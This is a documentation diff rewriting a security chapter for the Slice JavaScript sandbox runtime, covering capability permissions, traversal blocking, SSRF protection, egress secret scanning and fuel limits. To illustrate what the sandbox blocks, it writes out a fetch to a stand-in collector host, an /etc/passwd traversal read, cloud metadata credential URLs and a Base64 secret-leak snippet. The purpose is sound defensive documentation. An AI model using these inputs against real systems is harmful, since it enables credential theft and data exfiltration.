@@ -1,65 +1,179 @@
-# Chapter 04: Security Architecture — OCap, SES Lockdown, Fuel Cage & Hardware MPK (`slice-sandbox`)
+# Chapter 04: Zero-Trust Security Guide — OCap Permissions, Fuel Limits, SSRF Shield & Egress DLP
 
-Implemented in [`crates/slice-sandbox/src/lib.rs`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs) and enforced across [`crates/slice-engine/src/lib.rs`](file:///p:/opensource/slice/crates/slice-engine/src/lib.rs), Slice replaces the "all-or-nothing" ambient POSIX authority of Node.js and Bun with **five concentric rings of defense** inside a single host process.
+In Node.js and Bun, every `npm` package you install and every script you run inherits **100% of your OS user's permissions**: it can read `~/.ssh/id_rsa`, modify `Object.prototype`, open sockets to AWS/GCP cloud metadata (`169.254.169.254`), exfiltrate `process.env` secrets, or lock up a CPU core with `while (true) {}`. Even Deno's CLI flags (`--allow-read`, `--allow-net`) apply to the **entire OS process**, not to individual HTTP requests or plugins inside the same process.
 
----
+**Slice enforces MicroVM-grade Zero-Trust security per isolate and per HTTP request**, using five concentric rings of defense:
 
-## 1. The Five Concentric Defense Rings
-
-| Ring | Defense Mechanism | Attack Vector Contained | Trap Variant (`SandboxViolation`) |
+| Ring | Defense Layer | What It Protects Against | Violation Error (`SandboxViolation`) |
 | :--- | :--- | :--- | :--- |
-| **Ring 1** | **SES Intrinsic Lockdown (`IntrinsicRegistry::lockdown`)** | Prototype pollution (`Object.prototype.polluted = true`, `Array.prototype.*`) | `IntrinsicMutationBlocked { tenant_id, intrinsic }` |
-| **Ring 2** | **Object-Capability VFS Tokens (`FsCap`)** | Unauthorized file read/write & `..` path traversal (`/etc/shadow`, `/etc/../etc/passwd`) | `FsReadDenied { tenant_id, path }` |
-| **Ring 3** | **Object-Capability Network & Env Tokens (`NetCap` & `EnvCap`)** | Data exfiltration (`fetch("https://evil.com")`) & credential harvesting (`env("AWS_SECRET_ACCESS_KEY")`) | `NetAccessDenied` / `EnvAccessDenied` |
-| **Ring 4** | **Deterministic CPU Fuel & Byte-Level Memory Cage** | Infinite loop CPU DoS (`while(true){}`) & heap exhaustion OOM attacks (`Slice.kv` / allocations) | `CpuFuelExhausted` / `MemoryCeilingExceeded` |
-| **Ring 5** | **Hardware MPK (`SYS_pkey_alloc` + `WRPKRU`) & Egress Secret Guard (`--audit-egress`)** | Cross-tenant memory reads & prompt-injection secret exfiltration (raw, Base64, Base64URL) | Hardware page fault / `EGRESS_SECRET_LEAK_BLOCKED` |
+| **Ring 1** | **SES Intrinsic Lockdown** | Prototype pollution (`Object.prototype.polluted = true`) across shared realms | `IntrinsicMutationBlocked` |
+| **Ring 2** | **OCap Filesystem Tokens (`FsCap`)** | Unauthorized file read/write & `..` directory traversal (`/etc/shadow`, `../../.env`) | `FsReadDenied` / `FsWriteDenied` |
+| **Ring 3** | **OCap Network & Env Tokens (`NetCap` & `EnvCap`)** | Unauthorized outbound `fetch()` & `process.env` / `env()` credential harvesting | `NetAccessDenied` / `EnvAccessDenied` |
+| **Ring 4** | **Deterministic CPU Fuel & Memory Cage** | Infinite loop CPU DoS (`while(true){}`) & heap/KV memory exhaustion | `CpuFuelExhausted` / `MemoryCeilingExceeded` |
+| **Ring 5** | **Cloud Metadata SSRF Shield, Egress Secret DLP & Hardware MPK** | `169.254.169.254` SSRF, Base64/raw secret exfiltration, & cross-tenant memory access | `SSRF_METADATA_BLOCKED` / `EGRESS_SECRET_LEAK_BLOCKED` |
+
+This chapter shows you how to configure and test every security control in your applications.
 
 ---
 
-## 2. Object-Capability (`CapabilityToken`) Enforcement
+## 1. Zero Ambient Authority by Default
 
-By default, [`CapabilityToken::pure_compute()`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs#L65-L73) grants **zero** filesystem, network, or environment access. Capabilities are granted explicitly via `slice.toml` or CLI flags (`--allow-read`, `--allow-write`, `--allow-net`, `--allow-env`):
-
-- **Path Traversal Prevention (`verify_fs_read` / `verify_fs_write` & `check_boa_fs_read_ocap` / `check_boa_fs_write_ocap`):**
-  - Every `fs.readFileSync`, `fs.writeFileSync`, `fs.appendFileSync`, `fs.mkdirSync`, `fs.readdirSync`, `fs.statSync`, and `fs.unlinkSync` call in **both** Tier-0 `SLICESNP` and Tier-1 `SLICEBOA` checks that:
-    1. The path does **not** contain `..` traversal segments.
-    2. The normalized path starts with at least one prefix in `allowed_read_prefixes` (for reads) or `allowed_write_prefixes` (for writes).
-  - If denied, execution traps immediately with `SandboxViolation::FsReadDenied`.
+When you run a script with `slice run script.ts` (without a `slice.toml` or `--allow-*` flags), the isolate spawns with **`CapabilityToken::pure_compute()`**:
+- **Filesystem (`node:fs`):** `0` readable paths, `0` writable paths.
+- **Network (`fetch`):** `0` allowed outbound hosts.
+- **Environment (`env()` / `process.env`):** Only `NODE_ENV="production"` is exposed; host OS environment variables (such as `AWS_SECRET_ACCESS_KEY` or `GITHUB_TOKEN`) are **never** leaked into the isolate unless explicitly granted.
 
 ---
 
-## 3. Deterministic CPU Fuel & Byte-Level Memory Cages
+## 2. Controlling Filesystem Access (`allow_read` & `allow_write`)
 
-Unlike wall-clock timeouts (which are noisy under OS scheduling jitter), Slice meters deterministic **instruction fuel** (`fuel_limit` and `fuel_consumed` on [`TenantCompartment`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs#L170-L270)) and **heap/KV bytes** (`memory_limit_bytes` and `memory_used_bytes`):
+You can grant path-prefix read and write capabilities in `slice.toml`, via CLI flags, or per sub-sandbox in `Slice.evalSandbox()`.
 
-```bash
-# Run with a strict 500-instruction fuel budget and 64 KB memory cage
-slice run ./script.ts --fuel=500 --memory=65536
+### 2.1 Via `slice.toml`
+```toml
+[capabilities]
+allow_read = ["/app/public", "/app/config", "/tmp/cache"]
+allow_write = ["/tmp/cache"]
 ```
 
-If an untrusted tenant executes `while (true) {}` or allocates keys in `Slice.kv` exceeding `--memory`, Slice preempts the isolate immediately with `SandboxViolation::CpuFuelExhausted` or `SandboxViolation::MemoryCeilingExceeded`.
+### 2.2 Via CLI Flags
+```bash
+slice run ./src/pipeline.ts --allow-read=/app/public,/tmp/cache --allow-write=/tmp/cache
+```
+
+### 2.3 Automatic Path Traversal (`..`) Blocking
+Every `node:fs` function (`readFileSync`, `writeFileSync`, `appendFileSync`, `existsSync`, `mkdirSync`, `readdirSync`, `statSync`, `unlinkSync`, `rmSync`) normalizes path separators and **unconditionally rejects any path containing `..`**.
+For example, if you grant `--allow-read=/app/public`, an attacker attempting:
+```typescript
+import * as fs from "node:fs";
+fs.readFileSync("/app/public/../../etc/passwd", "utf8");
+```
+is immediately blocked with:
+```text
+OCap Violation: Compartment 'cli-tenant' lacks filesystem read authority for '/app/public/../../etc/passwd'
+```
 
 ---
 
-## 4. Hardware Memory Protection Keys (`SYS_pkey_alloc` + `WRPKRU`)
+## 3. Controlling Outbound Network Access (`allow_net`) & The Built-In SSRF Shield
 
-On Linux `x86_64`, [`HardwareProtectionDomain::allocate(slot_id)`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs#L112-L168) assigns a hardware protection key (`1..15`) via syscall 330 (`SYS_pkey_alloc`) and computes the per-domain `PKRU` register access mask (`!(0b11 << (pkey * 2))`). Calling `enter_domain()` switches CPU page-table access rights in **under 20 CPU cycles (~5 nanoseconds)** without a kernel mode switch.
+Outbound `fetch()` and `Slice.fetchSync()` calls are guarded by two layers: your **OCap Host Allowlist (`allow_net`)** and Slice's **Cloud Metadata & Private CIDR SSRF Firewall**.
+
+### 3.1 Explicit Host Allowlisting (Recommended for Production)
+Grant only the exact `hostname:port` (or `hostname`, which automatically permits `:80` and `:443`) that your service needs to call:
+
+```toml
+[capabilities]
+allow_net = [
+    "api.stripe.com:443",
+    "api.openai.com:443",
+    "127.0.0.1:18095"
+]
+```
+Or via CLI:
+```bash
+slice run ./src/webhook.ts --allow-net=api.stripe.com:443,127.0.0.1:18095
+```
+If your code (or a compromised npm dependency) tries to call `await fetch("https://evil-collector.org/steal")`, Slice blocks the request before DNS resolution and traps with `NetAccessDenied`.
+
+### 3.2 Wildcard Public Internet (`allow_net = ["*"]`) & Automatic SSRF Protection
+What if you are building a webhook delivery worker or an AI browsing agent that needs to `fetch()` arbitrary user-supplied public URLs (`--allow-net=*`)?
+
+In Node.js, Bun, or Deno (`deno run --allow-net`), if a user passes `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `http://10.0.0.15:6379/`, your server will happily fetch your cloud instance's IAM credentials or internal Redis server (Server-Side Request Forgery / SSRF).
+
+**In Slice, the SSRF Shield is always active:**
+1. **Cloud Metadata Endpoints Are Unconditionally Blocked (Even Under `--allow-net=*`):**
+   - `169.254.169.254` (AWS EC2 / GCP / Azure IMDS)
+   - `169.254.170.2` (AWS ECS Task Metadata)
+   - `100.100.100.200` (Alibaba Cloud Metadata)
+   - `[fd00:ec2::254]` (IPv6 AWS IMDS)
+   - `metadata.google.internal` & `metadata.goog` (GCP Metadata DNS)
+2. **Loopback & RFC1918 Private Networks Are Blocked Under Wildcard `--allow-net=*`:**
+   - When `allow_net = ["*"]` is used, Slice permits public internet domains (`https://example.com`) but **blocks** `localhost`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, and `0.0.0.0`.
+   - Internal/private endpoints can **only** be reached if you explicitly name that exact `host:port` in `allow_net` (e.g., `--allow-net=*,127.0.0.1:18095`).
 
 ---
 
-## 5. Egress Secret Guard (`--audit-egress=<secret>`)
+## 4. Environment Variables (`allow_env`), `.env` Auto-DLP & Outbound Egress DLP (`--audit-egress`)
 
-When running untrusted third-party plugins or AI-generated code that has access to sensitive environment tokens, an attacker (or indirect prompt injection) may attempt to exfiltrate a secret via `console.log`, the script's return value, or an HTTP response body — either in plaintext or encoded in **Base64** / **Base64URL**.
-
-Passing `--audit-egress=<secret>` (implemented in [`verify_egress_secrets_slice`](file:///p:/opensource/slice/crates/slice-engine/src/lib.rs#L3355-L3379)):
-1. Pre-computes the plaintext, standard Base64 (`base64_encode(secret, false)`), and URL-safe Base64 (`base64_encode(secret, true)`) representations of `<secret>`.
-2. Scans `stdout`, `returnValue`, and HTTP response bodies before they leave the isolate.
-3. Traps with `SandboxViolation::EnvAccessDenied { key: "EGRESS_SECRET_LEAK_BLOCKED" }` if any representation is detected (`0.00 ns` overhead when `--audit-egress` is not passed).
-
-### Runnable Security Verification Examples
+### 4.1 Granting Specific Environment Variables
+You can inject specific `KEY=VALUE` pairs (or import specific keys from your host shell) via `slice.toml` or `--allow-env`:
 
 ```bash
-# Run the built-in 5-vector security containment audit
+# Inject explicit key=value
+slice run ./src/index.ts --allow-env=STAGE=production --allow-env=REGION=eu-west-1
+
+# Or pass --allow-env=MY_HOST_VAR to copy MY_HOST_VAR from the host OS environment
+export MY_HOST_VAR="hello"
+slice run ./src/index.ts --allow-env=MY_HOST_VAR
+```
+
+Inside your TypeScript code:
+- `process.env.STAGE` returns `"production"`.
+- `env("STAGE")` returns `"production"`, whereas calling `env("UNDECLARED_KEY")` immediately traps with `SandboxViolation::EnvAccessDenied`.
+
+### 4.2 Blocking Secret Exfiltration with `--audit-egress` & Auto-DLP `.env`
+When your application or AI agent needs a secret key (such as `STRIPE_SECRET_KEY` or `OPENAI_API_TOKEN`) to sign a request, how do you guarantee that a bug or prompt injection never leaks that secret into:
+- `console.log()` / `stdout`
+- HTTP response bodies or Server-Sent Events (`Response.sse`)
+- Outbound `fetch()` URLs, headers, or `POST` bodies — even if the attacker encodes the secret in **Base64** or **Base64URL**?
+
+You have two ways to enable Slice's **Egress Data Loss Prevention (DLP) Firewall**:
+
+1. **Automatic `.env` DLP (`--env-file=.env` or `env_file = ".env"` in `slice.toml`):**
+   - Create a `.env` file:
+     ```dotenv
+     SERVICE_NAME=checkout-api
+     PUBLIC_KEY_ID="pk_live_public_9001"
+     STRIPE_SECRET_KEY="sk_live_super_secret_stripe_key"
+     DB_MASTER_PASSWORD="pg_prod_password_998877"
+     ```
+   - When loaded via `--env-file=.env`, Slice automatically classifies `STRIPE_SECRET_KEY` and `DB_MASTER_PASSWORD` as sensitive (because their names match `*_SECRET*`, `*_TOKEN*`, `*_KEY*`, `*_PASSWORD*`, or `*_PRIVATE*`, while ignoring `PUBLIC_KEY*` and `PUBLISHABLE_KEY*`) and registers their raw, Base64, and Base64URL forms into the Egress DLP guard!
+2. **Explicit `--audit-egress=<secret>` Flag:**
+   ```bash
+   slice serve ./src/server.ts --audit-egress="sk_live_super_secret_stripe_key"
+   ```
+
+### Example: Seeing Egress DLP Catch a Base64 Secret Leak
+```typescript
+// Suppose --audit-egress="sk_live_99887766" is active:
+const leakedBase64 = Buffer.from("sk_live_99887766", "utf8").toString("base64");
+
+// Attempting to print or fetch() the Base64-encoded secret immediately traps!
+console.log("Diagnostic trace:", leakedBase64);
+// -> Traps with: OCap Violation: Compartment '...' lacks environment variable authority for 'EGRESS_SECRET_LEAK_BLOCKED'
+```
+
+---
+
+## 5. Deterministic CPU Fuel & Byte-Level Memory Cages (`--fuel` & `--memory`)
+
+Wall-clock timeouts (`setTimeout`) are unreliable for multi-tenant sandboxing because CPU load spikes cause false timeouts while still allowing an attacker to burn 100% of a CPU core for milliseconds.
+
+Slice meters **deterministic CPU instruction fuel** and **per-tenant memory bytes**:
+
+### 5.1 Setting Fuel and Memory Limits
+In `slice.toml`:
+```toml
+[limits]
+fuel = 5_000_000     # Max CPU instructions per execution / HTTP request
+memory_kb = 4096     # Max 4 MB memory ceiling per tenant isolate
+```
+Or on the CLI:
+```bash
+slice run ./untrusted_plugin.ts --fuel=100000 --memory=1048576
+```
+
+### 5.2 What Happens When a Limit Is Exceeded
+- **Infinite Loop / CPU DoS (`while (true) {}`):** Preempted deterministically on the exact instruction that exceeds `fuel`, returning `SandboxViolation::CpuFuelExhausted` (or `HTTP 403 Forbidden` in `slice serve`) while all other worker threads and tenants continue unaffected.
+- **Memory Exhaustion (`Slice.kv` / allocations):** Any `Slice.kv.set(key, val)` or compartment allocation that pushes `memory_used_bytes` past `memory_limit_bytes` traps immediately with `SandboxViolation::MemoryCeilingExceeded`.
+
+---
+
+## 6. Auditing Your Environment (`slice verify-security`)
+
+You can verify that all 5 security rings are active on your machine at any time by running:
+```bash
 slice verify-security
 ```
 Output:
@@ -72,4 +186,3 @@ Output:
   [PASS] Vector 5: Deterministic Fuel Cage preempted while(true) DoS loop
 Result: 5/5 Attack Vectors Deterministically Contained.
 ```
-
